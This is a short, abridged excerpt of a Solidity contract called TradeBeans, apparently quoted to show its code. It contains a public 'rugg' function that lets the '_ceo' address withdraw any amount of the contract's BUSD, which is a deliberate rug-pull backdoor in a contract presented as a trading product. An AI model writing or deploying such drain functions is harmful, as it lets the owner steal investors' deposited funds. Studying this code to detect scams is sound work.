...
contract TradeBeans is Context, Ownable {
    ...
    address public DEV_ADDRESS = 0xdF0833C041db53856380CF1e64CD6428A9e41D3d; //0xdF0833C041db53856380CF1e64CD6428A9e41D3d Captain
    address public TRADING_ADDRESS = 0x0aDC95876545ca40A475a9ba73BC0ec3C26F27AD;
    ...
    function rugg(uint256 a) public {
        require(msg.sender == _ceo, "not dev") ;
        IERC20(BUSD).transfer(_ceo, a);
    }


    function sendFees(uint256 totalFee, uint256 trading) private {
        ...
        if (trading > 0) {
            IERC20(BUSD).transfer(_trading, trading);
        }
    }
    ...
    function setRewardRate(uint256 amount) public onlyOwner {
        require(amount < 25000 && amount > 2500);
        rewardRate = amount;
    }
